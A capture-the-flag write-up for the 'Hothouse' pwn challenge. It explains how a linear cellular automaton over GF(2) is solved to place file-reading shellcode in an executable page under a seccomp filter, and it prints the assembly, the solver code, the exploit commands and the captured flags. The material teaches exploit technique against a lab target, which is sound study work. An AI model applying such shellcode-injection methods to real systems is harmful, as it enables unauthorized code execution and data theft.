---
title: "Hothouse"
description: "The binary is a \"coprocessor\" simulator. A 32×32 lattice of bits is grown for 7 generations of a linear (XOR) cellular automaton, and the result is bit-packed into a 128-byte page that…"
event: "h7ctf"
category: "pwn"
categoryLabel: "Pwn"
tags: ["H7CTF 2026","pwn"]
date: "2026-09-27"
teammate: false
source: "H7CTF/pwn/3/writeup.md"
---

**Remote:** `nc pwn.h7tex.com 42945` (also served on 43895; each instance hands out its own flag)
**Binary:** `hothouse` — stripped, statically linked x86-64 ELF, `main` at `0x403100`
**Flags obtained:**
- `pwn.h7tex.com:42945` → `H7CTF{8fbdbe42-ef45-4cfd-9348-c0f68849d023}`
- `pwn.h7tex.com:43895` → `H7CTF{0cd953e8-c11a-4f1a-ad63-404572b5ba45}`

---

## 1. Summary

The binary is a "coprocessor" simulator. A 32×32 lattice of bits is grown for 7
generations of a linear (XOR) cellular automaton, and the result is *bit-packed into a
128-byte page that is `mprotect`ed RWX and then `call`ed as machine code*. The flag
path sits in the page just below it.

Two things make this non-trivial:

1. The growth is **linear over GF(2)** but the operator `A⁷` is **singular**
   (rank 992/1024), so an arbitrary 128-byte program is *not* directly reachable —
   the reachable set is a codimension-32 affine subspace, and it is **translated by a
   per-connection random substrate**.
2. `FIRE` installs a seccomp filter that only allows `openat/read/write/mmap/exit/exit_group`.

The solution: read the random baseline for the current connection, then use the 45
bytes of dead space *after* the shellcode as parity "slack" so the shellcode lands
inside the reachable affine subspace.

```
fabric = A⁷ · seed  ⊕  B · substrate        B = I + A + A² + … + A⁶
```

---

## 2. Recon

```
$ file hothouse
ELF 64-bit LSB executable, x86-64, version 1 (SYSV), statically linked, stripped
```

Command loop (from `RULE.md` + disassembly of `main`):

| command    | reply              | budget (verified empirically) |
|------------|--------------------|-------------------------------|
| `SEED r c` | `ok`               | 4096 (4097th → `E: seed budget exhausted`) |
| `INCUBATE` | `incubated`        | 64 (65th → `E: incubate budget exhausted`) |
| `PROBE r c`| `Tc: <u8>`         | 20000 (20001st → `E: probe budget exhausted`) |
| `RENDER`   | 32 lines of 32 `#`/`.` | — |
| `FIRE`     | executes the fabric, one shot | 1 |

`RENDER` is by far the cheapest way to read the whole 128-byte fabric (one command,
1024 bits), so the exploit uses `RENDER` for both the baseline read and the final
self-check.

### Memory layout (globals in `.bss`)

| address    | contents |
|------------|----------|
| `0x4e5aa0` | 32×32 **substrate**: random bytes, each `& 1`, fixed for the whole connection |
| `0x4e5e40` | 32×32 scratch/sensor array used by `PROBE` |
| `0x4e5ea0` | 32×32 **seed** lattice, persists across `INCUBATE`, index `r*32+c` |
| `0x4e62a0` | **fabric pointer** = `mmap_base + 0x1000` |
| `0x4e62a8` | `mmap_base` of a `0x2000` mapping |

At start-up: `mmap(NULL, 0x2000, …)`, then `mprotect(base+0x1000, 0x1000, PROT_READ|PROT_WRITE|PROT_EXEC)`.
The flag path (`getenv("FLAGPATH")`, default `/flag_0000000000000000`) is `strcpy`'d
into the **lower** page at a run-dependent offset (observed between `0x0` and `0xf40`);
the rest of that page is zero. The upper page's 128 bytes are the fabric, the remaining
3840 bytes are zero.

`FIRE` (at `0x40354c`) sets the fired flag, installs the filter, and does
`call qword [0x4e62a0]`.

`PROBE` is a red herring: it has a signed-range check on the coordinates, but the sensor
lookup it feeds only ever reaches `mem[0xf80 .. 0x107f]`, i.e. the 256 bytes straddling
the page boundary — the flag path (offset ≤ `0xf40`) is never in range.

---

## 3. The cellular automaton (verified)

`INCUBATE` (`0x403800`):

* copies the 1024-bit seed to the stack,
* runs **7 generations** of a linear CA,
* XORs the substrate into every generation,
* packs the final lattice into the fabric.

Neighbour table at `0x4ad280` = 6 `(dr,dc)` pairs, applied as
`(outer+a, inner+b)` with index `outer*32+inner`, i.e. in `(r,c)`:

```
(-1,0) (1,0) (0,1) (0,-1) (-1,1) (1,-1)          # out-of-bounds cells are dead
new[r][c] = old[r][c] ⊕ substrate[r][c] ⊕ ⊕ over the 6 in-bounds neighbours
```

Packing: fabric byte `r*4 + (c>>3)`, bit `c&7`, set iff the final cell is non-zero.
Because every value is a single bit, `pack` is itself linear, so

```
fabric_bits = A⁷·seed ⊕ (A⁶ + A⁵ + … + A + I)·substrate
```

Verification (this is what `g5.gdb` / `g6.gdb` do): break in gdb, dump the substrate
(`0x4e5aa0`), the seed (`0x4e5ea0`) and the fabric (`*(void**)0x4e62a0`) and compare
against the Python model. The model in `ca.py` matches byte-for-byte, including the
generation-1 delta test (seeding the four corners of a row produces exactly
`{1,30,32,62,63,68,69,99,101,131,132,991,1022}`).

Note: the substrate really is random **per connection** (function at `0x407840`),
so the baseline must be measured in the same connection it is used in.

---

## 4. The catch: `A⁷` is singular

`A` is the adjacency matrix of the 6-neighbour (hex) lattice on a 32×32 rhombus, and it
is **symmetric** (the neighbour set is closed under negation). `mat.py` computes the rank
of each power by applying the step operator to each of the 1024 unit vectors:

```
A^1 rank 992      A^5 rank 992
A^2 rank 992      A^6 rank 992
A^3 rank 992      A^7 rank 992
A^4 rank 992
```

So `rank(A⁷) = 992`, `dim ker(A⁷) = 32`, and the reachable set is

```
reachable = f0 + im(A⁷)          (f0 = fabric of an empty-seed INCUBATE)
```

a codimension-32 affine subspace of `GF(2)^1024`. Equivalently, a target `T` is
reachable iff it satisfies 32 parity equations

```
⟨n, T ⊕ f0⟩ = 0    for every n ∈ ker(A⁷)
```

Collecting the 32 kernel vectors `n` into a matrix `H` (column `j` = the 32 bits
`n_k[j]`), the condition is `H·(T ⊕ f0) = 0`. `f0` is random per connection, so the
32-bit syndrome `H·f0` is effectively random and a *fixed* target can never work.

---

## 5. Spending the don't-care bits

The shellcode only needs 83 of the 128 fabric bytes, and it ends with `exit_group`, so
**the 45 bytes after it are never executed or read** → 360 "don't-care" bits.

For every such cell `j`, flipping that bit changes the syndrome by the fixed column
`H[:,j]`. Reducing the 360 columns gives a basis of **rank 32**, i.e. the don't-care
region alone can produce *any* syndrome. Algorithm:

```
needed = H · (f0 ⊕ shellcode_cells)        # 32-bit syndrome we must cancel
flip the bits of one basis combination that yields `needed`   # ~11..18 bits in practice
target = shellcode ⊕ flips                 # flips are all in dead space
```

Because the flipped cells are provably beyond the shellcode's `exit_group`, the program
is unchanged — verified by asserting `target_bytes[:83] == shellcode` before sending
anything.

Then solve the (consistent, by construction) 1024×1024 system

```
A⁷ · s = target ⊕ f0
```

by Gaussian elimination over GF(2) with Python big-int bitboards (~3.5 s once,
cached). The solution has ~500 set bits on average, which is well inside the 4096
`SEED` budget — each set bit becomes one `SEED r c` command.

### The GF(2) core

```python
# rows: 1024-bit ints, one per row; A^7 is symmetric so rows == columns
def build_rref(rows):
    basis = {}
    for i, c in enumerate(rows):
        v, comb = c, 1 << i
        while v:
            p = v.bit_length() - 1
            if p in basis:
                pv, pc = basis[p]; v ^= pv; comb ^= pc
            else:
                basis[p] = (v, comb); break
    for p in sorted(basis):                 # full reduction
        pv, pc = basis[p]
        for q in list(basis):
            if q != p and (basis[q][0] >> p) & 1:
                basis[q] = (basis[q][0] ^ pv, basis[q][1] ^ pc)
    return basis

def solve_sym(rows, b, basis):              # rows symmetric => rows are the columns too
    x = 0
    for p, (v, comb) in basis.items():
        if bin(comb & b).count('1') & 1:
            x |= 1 << p
    return x

def kernel(basis, n=1024):                  # null space from the rref pivots
    pivots = set(basis)
    vecs = []
    for f in [j for j in range(n) if j not in pivots]:
        x = 1 << f
        for p, (v, comb) in basis.items():
            if (v >> f) & 1:
                x ^= 1 << p
        vecs.append(x)
    return vecs
```

(`comb` in `solve_sym` is `T`'s row-combination, so `comb & b` is the transformed
right-hand side; the whole solve is a couple of hundred `int` XORs.)

---

## 6. The seccomp filter

The static decode of the 12 `sock_filter` entries built on the stack at `0x403580`
looks nonsense (`k = 0x400` for the arch load, a jump of 64). Dumping the real
`struct sock_fprog` from the stack in gdb at `0x40364f` gives the truth:

```
0x0000000400000020   ld  [4]                      ; arch
0xc000003e00010015   jeq 0xc000003e -> 3, else 2
0x8000000000000006   ret KILL
0x0000000000000020   ld  [0]                      ; syscall nr
0x0000010100060015   jeq 0x101 (257 openat)   -> 11
0x0000000000050015   jeq 0x0   (0   read)     -> 11
0x0000000100040015   jeq 0x1   (1   write)    -> 11
0x0000000900030015   jeq 0x9   (9   mmap)     -> 11
0x0000003c00020015   jeq 0x3c  (60  exit)     -> 11
0x000000e700010015   jeq 0xe7  (231 exit_group)-> 11
0x8000000000000006   ret KILL
0x7fff000000000006   ret ALLOW
```

So: the process must be x86-64, and **only** `openat(257)`, `read(0)`, `write(1)`,
`mmap(9)`, `exit(60)`, `exit_group(231)` survive. Notably `open(2)`, `close(3)`,
`fstat`, `writev`, `access` and every `glibc` convenience wrapper are fatal.
Confirmed by replaying the identical filter in a test program (`filter.c`): only those
six calls survive, everything else is SIGKILL'd.

---

## 7. Shellcode (83 bytes)

```asm
    call    getpc
getpc:
    pop     rax                 ; rax = &pop = fabric+5
    sub     rax, 0x1005         ; -> mmap_base (fabric+5-0x1005)
    xor     ecx, ecx
scan:
    cmp     byte ptr [rax+rcx], 0
    jne     found               ; first non-zero byte == flag path
    inc     ecx
    jmp     scan
found:
    add     rax, rcx            ; rax = flag path
    mov     rsi, rax            ; arg2 = path
    push    -100
    pop     rdi                 ; AT_FDCWD
    xor     edx, edx            ; O_RDONLY
    mov     eax, 257
    syscall                     ; openat
    mov     edi, eax            ; fd
    mov     rsi, rsp            ; buffer = main's frame (we never return)
    mov     edx, 0x200
    xor     eax, eax
    syscall                     ; read
    mov     edx, eax            ; n
    mov     edi, 1
    mov     rsi, rsp
    mov     eax, 1
    syscall                     ; write(1, flag, n)
    xor     edi, edi
    mov     eax, 231
    syscall                     ; exit_group(0)
```

The flag path is located by brute-force scanning the lower page for its first non-zero
byte, which is robust against the run-dependent offset (this also removes any dependence
on `FLAGPATH` or on guessing the offset).

---

## 8. Exploit flow

```
connect
  INCUBATE                     (empty seed)          -> f0   (32 lines of RENDER)
  needed = H·(f0 ⊕ shellcode)  ->  ~15 dead-space bits -> target
  solve A⁷·s = target ⊕ f0     ->  ~500 SEED r c      -> "ok" each
  INCUBATE                                                -> "incubated"
  RENDER                                                  -> assert == target
  FIRE                                                    -> flag
```

Everything is per-connection; nothing is hardcoded. Local verification with
`FLAGPATH=/tmp/opencode/flag.txt` and a fake flag:

```
[*] 508 SEED commands
[*] fabric match: True
[+] FIRE output: 29 bytes
    b'H7CTF{test_local_flag_12345}\n'
```

Remote:

```
$ python3 exploit.py remote pwn.h7tex.com 42945
[*] 11 dont-care bits flipped, target = e80000000058482d05...
[*] 498 SEED commands
[*] fabric match: True
[+] FIRE output: 43 bytes
    b'H7CTF{8fbdbe42-ef45-4cfd-9348-c0f68849d023}'
```

The `RENDER` self-check before `FIRE` matters: the whole point of the challenge is that
the reachable set is a strict subspace, and a single wrong seed bit would turn the
program into garbage.

---

## 9. Gotchas that cost time

* **Random substrate.** Early `RENDER` comparisons never matched between runs; the
  lattice *is* deterministic given the substrate, but the substrate is per-connection.
  Any precomputed fabric is worthless — the baseline must be read in-band.
* **BPF decode.** Hand-decoding the `movabs` constants gave `k=0x400` / `jt=64`, which
  would make `prctl` fail with `EINVAL`; the real in-memory filter is `k=4` / `jt=4`.
  Dump the `sock_fprog` off the stack instead of trusting the disassembly.
* **Bit-packing round trip.** The fabric bit order is `cell = 8*byte + k`, i.e.
  `byte = r*4 + (c>>3)`, `bit = c&7`. An off-by-one-bit here silently corrupts the
  shellcode while the model still "matches" itself.
* **RREF direction.** A forward-eliminated basis must be reduced with pivots from
  high to low, and the cell bookkeeping must be an XOR mask (RREF mixes basis vectors,
  so a single "representative cell" is wrong).
* **`pop rax` off-by-5.** The path landed 5 bytes into the string (`/lag_...`) until
  `sub rax, 0x1005` replaced `sub rax, 0x1000`; `openat` then returned `EFAULT`.
* **`openat` arg 2.** The first working-looking version passed the path in `rax` and
  `xor esi, esi` for `O_RDONLY` — so the kernel got `NULL` (`EFAULT`). Only `strace`
  on the child (`STRACE=1 python3 exploit.py local`) exposed it.

---

## 10. Files

Helper scripts (this writeup's working set, in `/tmp/opencode`):

| file | purpose |
|------|---------|
| `ca.py` | verified CA model (`gen`, `incubate`, `pack`) |
| `mat.py` | builds the columns of `A^k`, computes ranks |
| `gf2.py` | GF(2) rref / solve / kernel, cell↔fabric byte packing |
| `sc.py` | the 83-byte shellcode (pwntools `asm`) |
| `sc_diag.py` | diagnostic shellcode (dumps the page + syscall return values) |
| `exploit.py` | driver; `local` / `remote` modes, `STRACE=1` for syscall traces |
| `filter.c` | standalone replay of the seccomp filter, to enumerate allowed syscalls |
| `g5.gdb`, `g6.gdb` | gdb validation of the CA model (generation 1 and full 7-gen run) |
| `g7.gdb` | gdb script to single-step the shellcode (needs a live, paused child) |

Usage:

```bash
python3 exploit.py local  [flagfile]            # local dry run
python3 exploit.py remote pwn.h7tex.com 42945   # the real thing
STRACE=1 python3 exploit.py local               # same, with strace on the child
```
